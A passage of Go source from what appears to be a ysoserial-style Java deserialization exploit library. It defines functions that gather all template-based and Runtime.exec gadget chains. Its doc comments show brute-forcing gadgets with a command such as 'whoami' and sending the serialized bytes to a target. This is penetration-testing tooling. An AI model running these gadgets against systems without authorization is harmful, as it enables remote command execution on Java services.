//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// 发送 objBytes
//	}
//
// ```
func GetAllTemplatesGadget() []TemplatesGadget {
	var allGadget []TemplatesGadget
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		if !cfg.IsTemplateImpl {
			continue
		}
		allGadget = append(allGadget, func(options ...GenClassOptionFun) (*JavaObject, error) {
			anyOpts := []any{}
			for _, opt := range options {
				anyOpts = append(anyOpts, opt)
			}
			return GenerateGadget(name, anyOpts...)
		})
	}
	return allGadget
}

// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
// Example:
// ```
//
//	command := "whoami" // 假设的命令字符串
//	for _, gadget := range yso.GetAllRuntimeExecGadget() {
//		javaObj, err := gadget(command)
//		if javaObj == nil || err != nil {
//			continue
//		}
//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// 发送 objBytes
//	}
//
// ```
func GetAllRuntimeExecGadget() []RuntimeExecGadget {
	var allGadget []RuntimeExecGadget
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		if cfg.IsTemplateImpl {
			continue
		}
		allGadget = append(allGadget, func(cmd string) (*JavaObject, error) {
			return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
		})
	}
	return allGadget
}
